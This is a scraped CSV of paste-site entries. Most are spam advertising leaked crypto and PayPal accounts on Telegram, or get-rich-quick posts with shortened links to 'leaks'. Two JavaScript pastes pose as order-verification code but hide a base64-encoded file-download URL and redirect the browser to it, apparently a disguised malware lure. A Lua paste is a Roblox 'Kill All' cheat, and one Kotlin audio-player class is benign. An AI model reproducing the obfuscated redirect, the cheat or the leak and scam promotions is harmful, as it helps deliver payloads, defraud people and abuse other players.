id,title,username,language,date,content
skUpvdT7,Crypto Accounts,dentira,JavaScript,Thursday 1st of May 2025 07:21:42 PM CDT,13170 Accounts Posted On https://t.me/leakzbyeminem
HVQTSm5J,Market.js,dentira,JavaScript,Thursday 1st of May 2025 07:21:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34901/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZATxbGe2,Make $1000 15-MINUTES  (BEGINNER) YR,AdrianAndia999,JavaScript,Thursday 1st of May 2025 07:21:05 PM CDT," 
Pdf https://tinyurl.com/freshleaks

9T48HILmif
"
ydw2H6cx,EARN $900 INSTANTLY 2025 95,AdrianAndia999,JavaScript,Thursday 1st of May 2025 07:11:51 PM CDT," 
Pdf https://tinyurl.com/freshleaks

4CuqSBIzpL
"
agXujrPZ,audio player,Kaze79,Kotlin,Thursday 1st of May 2025 07:09:34 PM CDT,"actual class AudioPlayer(private val context: Context) {
    private val audioTrack = createAudioTrack()
    private val audioChannel = Channel<ByteArray>(capacity = Channel.UNLIMITED)
    private var streamingJob: Job? = null

    @OptIn(DelicateCoroutinesApi::class)
    actual fun cache(data: ByteArray) {
        Napier.d(tag = TAG) { ""caching; audio track state: ${audioTrack.state}"" }
        if (audioChannel.isClosedForSend.not()) {
            audioChannel.trySend(data)
        }
    }

    actual fun play() {
        if (audioTrack.state != AudioTrack.STATE_INITIALIZED) {
            Napier.d(tag = TAG) { ""state at play: ${audioTrack.state}"" }
        } else {
            Napier.d(tag = TAG) { ""playing"" }
            audioTrack.play()

            streamingJob = CoroutineScope(Dispatchers.IO).launch {
                for (chunk in audioChannel) {
                    audioTrack.write(chunk, 0, chunk.size)
                }
            }
        }
    }

    actual fun stop() {
        streamingJob?.cancel()
        audioTrack.apply {
            stop()
            release()
        }
        audioChannel.close()
    }

    actual fun retrieveFile(path: String): ByteArray? {
        Napier.d(tag = TAG) { ""state at retrieval: ${audioTrack.state}"" }

        try {
            return File(context.cacheDir, ""snow.wav"").readBytes()
//            return File(context.cacheDir, path).readBytes()
        } catch (e: Exception) {
            Napier.e(tag = TAG) { ""Error: ${e.message}"" }
            return null
        }
    }

    private fun createAudioTrack(): AudioTrack {
        val channelConfig = AudioFormat.CHANNEL_OUT_MONO
        val audioFormat = AudioFormat.ENCODING_PCM_16BIT
        val bufferSize = AudioTrack.getMinBufferSize(SAMPLE_RATE, channelConfig, audioFormat)

        return AudioTrack(
            AudioAttributes.Builder()
                .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                .build(),
            AudioFormat.Builder()
                .setEncoding(audioFormat)
                .setSampleRate(SAMPLE_RATE)
                .setChannelMask(channelConfig)
                .build(),
            bufferSize,
            AudioTrack.MODE_STREAM,
            AudioManager.AUDIO_SESSION_ID_GENERATE
        ).also { Napier.d(tag = TAG) { ""state at creation: ${it.state}"" } }
    }
}

private const val TAG = ""AudioPlayer""
private const val SAMPLE_RATE = 24_000"
eCcAYrgf,PayPal with Balance,dentira,JavaScript,Thursday 1st of May 2025 07:06:20 PM CDT,81356 Accounts Posted On https://t.me/leakzbyeminem
RQGygTqM,Untitled,dentira,JavaScript,Thursday 1st of May 2025 07:06:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13516/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
G7zLNDys,Kill All v.2,Me_Hker,Lua,Thursday 1st of May 2025 07:03:08 PM CDT,"-- Get the player
local player = game.Players.LocalPlayer

-- Create GUI
local gui = Instance.new(""ScreenGui"", player.PlayerGui)
gui.ResetOnSpawn = false 

-- Create Frame
local frame = Instance.new(""Frame"", gui)
frame.Size = UDim2.new(0, 120, 0, 180)
frame.Position = UDim2.new(0.5, -60, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(125, 255, 255)
frame.Active, frame.Draggable = true, true

-- Create Buttons/Inputs
local function createButton(text, pos, color, parent, size)
    local btn = Instance.new(""TextButton"", parent)
    btn.Size = size or UDim2.new(0, 100, 0, 30)
    btn.Position = pos
    btn.BackgroundColor3 = color
    btn.Text = text
    btn.TextScaled = true
    return btn
end

local function createTextbox(pos, parent)
    local box = Instance.new(""TextBox"", parent)
    box.Size = UDim2.new(0, 100, 0, 30)
    box.Position = pos
    box.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    box.PlaceholderText = ""hp%""
    box.Text = """"
    box.TextScaled = true
    return box
end

-- UI Elements
local inputBox = createTextbox(UDim2.new(0.5, -50, 0.3, 0), frame)
local toggleButton = createButton(""เปิด"", UDim2.new(0.5, -50, 0.55, 0), Color3.fromRGB(255, 255, 255), frame)
local minimizeButton = createButton(""ย่อเมนู"", UDim2.new(0.5, -50, 0.8, 0), Color3.fromRGB(255, 0, 0), frame)
local openButton = createButton(""เปิด"", UDim2.new(0.02, 0, 0.02, 0), Color3.fromRGB(125, 255, 125), gui, UDim2.new(0, 50, 0, 30))
openButton.Visible = false

-- Toggle loop logic
local running = false
toggleButton.MouseButton1Click:Connect(function()
    running = not running
    toggleButton.Text = running and ""ปิด"" or ""เปิด""

    if running then
        task.spawn(function()
            while running do
                local inputValue = tonumber(inputBox.Text) or 0
                local threshold = (inputValue <= 0) and 0.9999 or (inputValue / 100)

                sethiddenproperty(player, ""SimulationRadius"", math.huge)
                sethiddenproperty(player, ""MaxSimulationRadius"", math.huge)

                for _, d in pairs(workspace:GetDescendants()) do
                    if d:IsA(""Humanoid"") and d.Parent.Name ~= player.Name then
                        if d.Health <= (d.MaxHealth * threshold) then
                            d.Health = 0
                        end
                    end
                end
                task.wait(0.1)
            end
        end)
    end
end)

-- Minimize/Maximize
minimizeButton.MouseButton1Click:Connect(function()
    frame.Visible = false
    openButton.Visible = true
end)

openButton.MouseButton1Click:Connect(function()
    frame.Visible = true
    openButton.Visible = false
end)

-- Drag support
local function enableDragging(guiElement)
    local dragging, dragInput, mousePos, framePos

    guiElement.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            mousePos = input.Position
            framePos = guiElement.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    guiElement.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - mousePos
            guiElement.Position = UDim2.new(
                framePos.X.Scale, framePos.X.Offset + delta.X,
                framePos.Y.Scale, framePos.Y.Offset + delta.Y
            )
        end
    end)
end

enableDragging(frame)
enableDragging(openButton)"
685qUsUp,Make $1000 15-MINUTES (BEGINNER) L4,AdrianAndia999,JavaScript,Thursday 1st of May 2025 07:02:35 PM CDT," 
Pdf https://tinyurl.com/freshleaks

AvA41RnXYg
"
aaPBaMK9,"[Stupid Simple] Earn $800-$2,400 Monthly with a Side Hustle",anantsoftcomputing,PHP,Thursday 1st of May 2025 07:00:33 PM CDT,"tinyurl.com/nulledleak



SPBAJDH

"
